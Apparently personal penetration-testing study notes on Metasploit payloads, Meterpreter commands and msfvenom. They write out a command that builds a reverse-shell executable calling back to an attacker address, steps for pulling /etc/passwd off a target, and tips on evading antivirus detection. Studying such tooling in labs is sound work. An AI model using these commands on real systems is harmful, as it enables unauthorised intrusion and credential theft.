---
tags: metasploit, msfvenom
---
## Staged vs Non-Staged Payloads

Non-staged payload:
- contains the exploit and the shellcode ("all-in-one")
- more stable
- bigger file size
- name format: e.g. `payload/linux/x64/shell_reverse_tcp`

Staged payload:
- sent in two parts:
	- first part is a small binary payload that causes the victim machine to connect back to the attacker and transfer a larger secondary payload and execute it
	- second part is the rest of the shellcode
- name format: e.g. `payload/linux/x64/shell/reverse_tcp`

Pros of using staged payload:
- suitable for cases where there are space limitations in an exploit
- evade shellcode detection by AV

Show list of payloads compatible with the currently selected module:
`show payloads`

Set a payload for the current exploit module:
`set payload [payload number]`

Run module:
`run`

## Meterpreter Payload
a multi-function payload that can be dynamically extended at run-time
- payload resides entirely in memory on the target
- communication is encrypted by default
- especially useful in the post-exploitation phase
- technically all are staged
	- "non-staged" version includes all components required to launch the session
		- good when bandwidth is limited
	- "staged" version uses a separate first stage to load these components

Show list of payloads compatible with the currently selected module:
`show payloads`

Set a payload for the current exploit module:
`set payload [payload number]`

### Meterpreter commands

Display Meterpreter commands (after running exploit module with Meterpreter payload to obtain a Meterpreter command prompt):
`help`
- command with an 'l' prefix operate on the local system (our Kali machine)

Get info on target computer:
`sysinfo`
`getuid`

Start interactive shell (will run in a new channel):
`shell`

Background a channel:
Ctrl + Z then `y`

List all active channels:
`channel -l`

Interact with a channel:
`channel -i [channel ID]`

Download file to local machine (our Kali machine):
1. Check the local directory:
   `lpwd`
2. Change the local directory to where you want the file to be downloaded to:
   `lcd /home/kali/Downloads`
3. Download file from target machine:
   `download /etc/passwd`
4. Read the newly downloaded file on the local machine:
   `lcat /home/kali/Downloads/passwd`

Upload file to target machine:
`upload [file path on local machine] [directory on target machine to upload to]`
E.g. `upload /usr/bin/unix-privesc-check /tmp/`

> If target machine is Windows, need to escape the backslashes in the path with `\\`

Exit current session:
`exit`

### More info

TCP vs HTTPS Meterpreter payloads:
- Using a HTTPS Meterpreter payload would look like regular encrypted HTTPS traffic, so can evade detection
- If the address of the HTTPS communication endpoint (our Kali machine) is checked, only a 404 Not Found will be returned in the browser

> Since Metasploit is so popular, the detection rates of Metasploit payloads are quite high by security technologies. It is recommended to attempt to obtain an initial foothold in the target with a raw TCP shell, disable or bypass security technologies, then deploy a Meterpreter shell. (Out of scope of this module)

## Executable Payloads
export payloads into various file types and formats such as Windows and Linux binaries, webshells, and more

Tool: msfvenom
- provided in Metasploit for generate these payloads

(on Kali command line)

List payloads:
`msfvenom -l payloads --platform windows --arch x64`
- `-l payloads`: list payloads
- `--platform windows`: specify platform for the payload
- `--arch x64`: specify architecture for the payload

Export payload:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe`
- `-p windows/x64/shell_reverse_tcp`: specify payload
- `LHOST=192.168.119.2 LPORT=443`: assign values to options
- `-f exe`: set output format
- `-o nonstaged.exe`: specify output filename

Then, we can transfer the malicious binary to the target machine and execute it.

> `nc` on our Kali machine only works with non-staged payloads. For staged payloads, we can use Metasploit's *multi/handler* module (works for the majority of staged, non-staged, and more advanced payloads like Meterpreter)

### multi/handler module

In Metaploit command line, select the module with `use`:
`use multi/handler`

Specify the payload of the incoming connection:
`set payload windows/x64/shell/reverse_tcp`

Set options for the payload:
`show options`
`set [option] [value]`

Run module:
`run`

Then, we can run the exported payload binary on the target machine and the Metasploit multi/handler receives the incoming staged payload and provides us with an interactive reverse shell in the context of a session.

### Use cases

- can use them to create executable file types such as PowerShell scripts, Windows executables, or Linux executable files to transfer them to a target and start a reverse shell
- can create malicious files such as web shells to exploit web application vulnerabilities
- can use the generated files from msfvenom as part of a client-side attack

